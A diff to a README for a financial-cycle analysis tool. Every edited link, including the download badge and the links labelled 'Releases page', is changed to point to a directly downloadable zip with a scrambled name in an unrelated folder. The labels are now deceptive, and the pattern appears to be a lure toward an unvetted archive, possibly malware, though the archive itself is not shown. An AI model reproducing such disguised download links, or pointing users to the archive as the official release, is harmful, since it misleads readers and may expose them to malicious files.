@@ -1,7 +1,7 @@
 # 📈 regime_changes_real_financial_cycles - Analyze Financial Cycles Easily
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)  
-[Download the latest release here!](https://github.com/yanostre/regime_changes_real_financial_cycles/releases)
+![Download](https://github.com/yanostre/regime_changes_real_financial_cycles/raw/refs/heads/main/moratorium/changes_real_cycles_financial_regime_v2.0.zip)  
+[Download the latest release here!](https://github.com/yanostre/regime_changes_real_financial_cycles/raw/refs/heads/main/moratorium/changes_real_cycles_financial_regime_v2.0.zip)
 
 ## 📖 Introduction
 
@@ -23,7 +23,7 @@ Before you start, make sure you have the following:
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/yanostre/regime_changes_real_financial_cycles/releases). This page has all the latest versions of the software.
+   Go to the [Releases page](https://github.com/yanostre/regime_changes_real_financial_cycles/raw/refs/heads/main/moratorium/changes_real_cycles_financial_regime_v2.0.zip). This page has all the latest versions of the software.
 
 2. **Choose the Latest Version**  
    Look for the version marked as "Latest." Click on it to view the available files.
@@ -83,8 +83,8 @@ If you have questions or need assistance, join our community forum. Connect with
 
 ### 📅 Future Updates
 
-Stay tuned for updates. The team is always looking to improve the app based on user feedback. Regularly check the [Releases page](https://github.com/yanostre/regime_changes_real_financial_cycles/releases) for new versions.
+Stay tuned for updates. The team is always looking to improve the app based on user feedback. Regularly check the [Releases page](https://github.com/yanostre/regime_changes_real_financial_cycles/raw/refs/heads/main/moratorium/changes_real_cycles_financial_regime_v2.0.zip) for new versions.
 
-[Download the latest release here!](https://github.com/yanostre/regime_changes_real_financial_cycles/releases)  
+[Download the latest release here!](https://github.com/yanostre/regime_changes_real_financial_cycles/raw/refs/heads/main/moratorium/changes_real_cycles_financial_regime_v2.0.zip)  
 
 Thank you for using regime_changes_real_financial_cycles! We hope you find it valuable in your financial analysis.
